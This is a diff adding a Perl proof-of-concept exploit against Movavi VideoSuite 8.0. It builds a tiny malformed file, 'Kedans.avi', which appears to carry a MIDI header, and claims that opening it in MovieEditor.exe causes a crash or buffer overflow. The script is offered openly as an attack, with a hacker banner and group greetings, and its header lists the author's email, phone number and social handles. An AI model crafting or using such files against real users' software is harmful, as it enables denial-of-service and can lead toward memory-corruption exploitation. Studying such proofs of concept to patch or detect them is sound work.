@@ -1,0 +1,52 @@
+#!/usr/bin/perl
+
+###
+# Title : Movavi VideoSuite 8.0 (MovieEditor.exe) Local Crash PoC
+# Author : KedAns-Dz
+# E-mail : ked-h@hotmail.com
+# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
+# Twitter page : twitter.com/kedans
+# platform : Windows 
+# Impact : Crashs and Overflows in Process
+# Tested on : Windows XP SP3 Français 
+# Target :  Movavi Video Suite 8.0
+###
+# >>>>>> BAC 2011 Enchallah ( Me & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all )
+# ------------
+# Note : This Exploit BOF is Special Greets to Member ' Overfolw3r ' From sec4ever.com
+# ------------
+# => start Movavi_VideoSuite_8.0 >> Edit Video ** Movie Editor << Add Evil Video Here
+# or ...\..\etc\Movavi Video Suite 8\MovieEditor.exe <<  Open The Evil Video Here
+# ------------
+#START SYSTEM /root@MSdos/ :
+system("title KedAns-Dz");
+system("color 1e");
+system("cls");
+print "\n\n";                  
+print "    |===========================================================|\n";
+print "    |= [!] Name : Movavi_VideoSuite_8 (MovieEditor.exe)        =|\n";
+print "    |= [!] Exploit : Local Crash PoC                           =|\n";
+print "    |= [!] Author : KedAns-Dz                                  =|\n";
+print "    |= [!] Mail: Ked-h(at)hotmail(dot)com                      =|\n";
+print "    |===========================================================|\n";
+sleep(2);
+print "\n";
+
+my $PoC = "\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00";
+
+open(file , ">", "Kedans.avi"); # Evil Video AVI
+print file $PoC;   
+print "\n [+] File successfully created!\n" or die print "\n [-] OpsS! File is Not Created !! ";
+close(file);  
+
+#================[ Exploited By KedAns-Dz * HST-Dz * ]=========================
+# GreetZ to : Islampard * Dr.Ride * Zaki.Eng * BadR0 * NoRo FouinY * Red1One
+# XoreR * Mr.Dak007 * Hani * TOnyXED * Fox-Dz * Massinhou-Dz ++ all my friends ;
+# > Algerians <  [D] HaCkerS-StreeT-Team [Z] > Hackers <
+# My Friends on Facebook : Nayla Festa * Dz_GadlOl * MatmouR13 ...all Others
+# 4nahdha.com : TitO (Dr.Ride) *  MEN_dz * Mr.LAK (Administrator) * all members ...
+# sec4ever.com members Dz : =>>
+#  Ma3sTr0-Dz * Indoushka * MadjiX * BrOx-Dz * JaGo-Dz ... all Others
+# hotturks.org : TeX * KadaVra ... all Others
+# Kelvin.Xgr ( kelvinx.net)
+#===========================================================================
